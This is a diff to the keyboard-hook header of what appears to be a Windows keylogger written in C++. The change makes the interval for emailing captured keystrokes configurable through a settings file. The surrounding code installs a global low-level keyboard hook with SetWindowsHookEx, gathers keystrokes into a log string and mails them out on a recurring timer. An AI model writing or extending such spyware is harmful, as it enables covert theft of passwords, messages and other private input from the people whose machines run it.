@@ -1,5 +1,5 @@
-#ifndef KEYHOOK_H
-#define KEYHOOK_H
+#ifndef _KEYHOOK_H
+#define _KEYHOOK_H
 
 #include <iostream>
 #include <fstream>
@@ -7,8 +7,10 @@
 #include "KeyConstants.h"
 #include "Timer.h"
 #include "SendMail.h"
+#include "Settings.h"
 
 std::string keylog{ "" };
+constexpr unsigned long DEFAULT_SEND_INTERVAL = 500 * 60;
 
 void TimerSendMail()
 {
@@ -33,7 +35,7 @@ void TimerSendMail()
         keylog = "";
 }
 
-Timer MailTimer{ TimerSendMail, 500 * 60, Timer::Infinite };
+Timer MailTimer{ TimerSendMail, DEFAULT_SEND_INTERVAL, Timer::Infinite };
 
 HHOOK eHook = nullptr;
 
@@ -99,6 +101,10 @@ bool InstallHook()
 {
     IO::MKDir(IO::GetOurPath(true));
     Helper::WriteAppLog("Hook Started... Timer Started");
+
+    if (Settings::Instance().GetReader() != nullptr)
+        MailTimer.SetInterval(Settings::Instance().GetReader()->GetInteger("Timer", "send_interval", DEFAULT_SEND_INTERVAL));
+
     MailTimer.Start(true);
     
     eHook = SetWindowsHookEx(WH_KEYBOARD_LL, static_cast<HOOKPROC>(OurKeyboardProc), GetModuleHandle(nullptr), 0);
@@ -118,4 +124,4 @@ bool IsHooked()
     return eHook == nullptr;
 }
 
-#endif // !KEYHOOK_H
+#endif // !_KEYHOOK_H
